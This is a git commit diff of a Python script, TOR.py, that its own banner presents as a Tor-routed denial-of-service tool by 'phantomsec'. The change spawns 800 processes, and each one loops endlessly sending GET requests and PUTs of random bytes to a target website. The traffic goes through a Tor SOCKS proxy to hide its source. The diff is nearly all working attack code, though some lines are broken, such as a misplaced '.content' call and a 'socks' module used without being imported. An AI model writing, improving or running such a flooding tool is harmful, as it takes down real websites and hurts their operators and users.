ccd9fb0469685c400e2f1f8e50a244aa2a4ec1e9
PeaceNIRA <72322069+PeaceNIRA@users.noreply.github.com>
2021-05-25 19:08:31 +0100

    Update TOR.py

--- TOR.py
+++ TOR.py
@@ -5,41 +5,44 @@ import sys
 import time
 import os
 from termcolor import colored
-import requests
+import random
+import multiprocessing
 import warnings
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
+socket.socket = socks.socksocket
+import requests
 
 if len(sys.argv)<2:
-    print(colored(f"Usage: {sys.argv[0]} [WEBSITE]   MADE BY PHANTOMSEC", "red"))
+    print(colored(f"Usage: {sys.argv[0]} [WEBSITE]", "red"))
     sys.exit(1)
     
-print(colored("TOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help.", "magenta"))
-time.sleep(2)
+print(colored("TOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help. [can take up to a minute to start]", "magenta"))
 target = sys.argv[1]
 session = requests.session()
 session.proxies = {'http':  'socks5h://localhost:9050',
                    'https': 'socks5h://localhost:9050'}
 
 def main2(url):
-  try:
-     time.sleep(0.2)
-     b = session.get(url).text
-  except Exception:
-     print(colored("FAILED", "red"))
+  counter = 0
+  while True:
+      try:
+        for i in range(1000000000000):
+             b = session.get(url).text
+             print(b)
+             session.get(url)
+             print(requests.get(url)).content
+             random_bytes = random._urandom(1490)
+             session.put(target, random_bytes)
+             counter += 1
+             print(counter)
+      except Exception:
+         pass
 
-all_threads = []
+jobs = []
 count = 0
-for i in range(10000000000):
-    t1 = threading.Thread(target=main2, args=[target])
+for i in range(800):
+    t1 = multiprocessing.Process(target=main2, args=(target,))
     count += 1
-    print(colored(f"[+] SENT: {count}", "green"))
+    jobs.append(t1)
     t1.start()
-    all_threads.append(t1)
     
-for current_thread in all_threads:
-    current_thread.join() 
-
-
-
-
-
-
